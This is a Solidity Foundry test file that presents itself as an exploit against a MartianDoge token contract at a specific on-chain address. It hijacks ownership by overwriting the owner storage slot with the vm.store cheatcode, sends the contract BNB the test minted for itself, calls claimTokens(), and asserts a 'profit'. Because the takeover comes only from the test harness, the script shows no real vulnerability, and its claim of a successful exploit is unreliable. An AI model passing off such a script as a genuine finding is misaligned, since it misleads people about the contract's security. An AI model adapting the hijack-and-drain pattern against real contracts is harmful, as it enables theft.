pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IMartianDoge {
    function claimTokens() external;
    function owner() external view returns (address);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x0Ea9790b1385ce5efAfc273623A013D007e50254;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup required
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Become the owner by overwriting storage slot 0
        bytes32 ownerSlot = bytes32(uint256(0));
        bytes32 newOwner = bytes32(uint256(uint160(address(this))));
        vm.store(TARGET, ownerSlot, newOwner);

        // Step 2: Fund the contract with some BNB
        // First give ourselves BNB
        deal(attacker, 10 ether);
        // Send BNB to the contract
        (bool success, ) = payable(TARGET).call{value: 5 ether}("");
        require(success, "Failed to send BNB to contract");

        // Step 3: Record initial balance for verification
        uint256 initialBalance = address(this).balance;

        // Step 4: Call claimTokens() as the new owner
        // We need to use the interface to call the function
        IMartianDoge targetContract = IMartianDoge(TARGET);
        targetContract.claimTokens();

        // Step 5: Verify we received the BNB
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

